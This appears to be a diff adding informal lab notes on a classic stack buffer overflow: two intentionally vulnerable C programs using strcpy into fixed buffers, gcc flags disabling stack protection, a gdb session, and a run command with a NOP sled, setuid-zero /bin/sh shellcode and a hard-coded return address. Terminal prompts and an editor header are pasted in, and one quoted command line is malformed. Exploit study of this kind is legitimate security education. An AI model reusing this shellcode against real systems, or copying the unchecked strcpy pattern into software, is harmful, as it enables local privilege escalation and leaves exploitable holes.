@@ -1,0 +1,46 @@
+#include <stdio.h> 
+#include <stdlib.h>
+#include <string.h>
+
+void vulnerable(char *tmp) 
+{  
+    char input[400];  
+    strcpy(input,tmp); //character buffer  
+}  
+
+int main(int argc, char* argv[]) 
+{
+    vulnerable(argv[1]); 
+    return 0;  
+}
+
+
+
+
+
+
+  GNU nano 7.2                                code1.c                                         
+#include <string.h>
+#include <stdio.h>
+void main(int argc, char *argv[]) {
+        copier(argv[1]);
+        printf("Done!\n");
+}
+int copier(char *str) {
+        char buffer[4];
+        strcpy(buffer, str);
+}
+
+
+└─# gcc code1.c -o code1 -m32 -fno-stack-protector -z execstack -m32
+
+gcc escalate.c -o escalate -m32 -fno-stack-protector -z execstack
+
+
+└─# gdb -q --args ./escalate 'python -c 'print "A"*400''  
+
+
+
+
+run $(python -c 'print "\x90"*359 +"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x80\xd4\xff\xff"'`
+           
